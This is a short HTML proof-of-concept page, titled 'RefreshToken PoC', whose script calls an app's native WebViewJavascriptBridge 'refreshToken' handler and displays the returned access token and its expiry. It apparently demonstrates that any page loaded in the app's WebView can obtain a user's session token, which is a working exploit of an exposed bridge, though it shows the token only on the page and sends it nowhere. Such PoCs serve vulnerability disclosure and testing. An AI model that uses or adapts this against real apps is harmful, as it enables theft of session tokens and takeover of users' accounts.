<html>
  <body style="background:#111; color:#0f0; font-family:monospace;">
    <h1>RefreshToken PoC</h1>
    <pre id="result">Waiting for token...</pre>
    
    <script>
    window.WebViewJavascriptBridge.callHandler("refreshToken", "", function(resp) {
      let output = "";

      try {
        const json = JSON.parse(resp);
        output += "Access Token:\n" + json.token + "\n\n";
        output += "Expires In: " + json.expiresIn + "\n";
      } catch (e) {
        output = "Error parsing JSON:\n" + resp;
      }

      document.getElementById("result").innerText = output;
    });
    </script>
  </body>
</html>
